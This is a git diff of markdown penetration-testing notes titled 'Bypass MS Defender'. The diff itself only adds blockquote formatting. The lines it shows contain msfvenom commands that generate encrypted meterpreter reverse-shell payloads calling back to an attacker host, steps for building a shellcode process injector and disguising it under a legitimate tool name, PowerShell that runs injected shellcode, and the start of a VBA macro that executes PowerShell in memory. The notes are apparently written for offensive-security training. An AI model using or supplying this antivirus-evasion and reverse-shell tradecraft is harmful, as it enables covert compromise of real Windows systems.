@@ -9,15 +9,15 @@
 
 # Bypass MS Defender 
 
-Generate Shellcode for C#
+> Generate Shellcode for C#
 
 ```shell
 python3 shellcodeCrypter-msfvenom.py kali 443 xor cs 250 windows/x64/meterpreter/reverse_http
 ```
 
-Clone the [Shellcode Process Injector](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Injector) project and copy the previous shellcode at buf variable. `Build` -> `Batch Build` -> `Select a Build` -> Click on `Build` .
+> Clone the [Shellcode Process Injector](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Injector) project and copy the previous shellcode at buf variable. `Build` -> `Batch Build` -> `Select a Build` -> Click on `Build` .
 
-Rename the final executable. Use offical appilcation names like: procexp64
+> Rename the final executable. Use offical appilcation names like: procexp64
 
 ```shell
 .\procexp64.exe
@@ -57,13 +57,13 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 ```
 
-Generate the reverse shell payload
+> Generate the reverse shell payload
 
 ```shell
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.203 LPORT=443 EXITFUNC=thread -f ps1
 ```
 
-Create a macro that executes a PS in-memory
+> Create a macro that executes a PS in-memory
 
 ```vb
 Sub MyMacro()
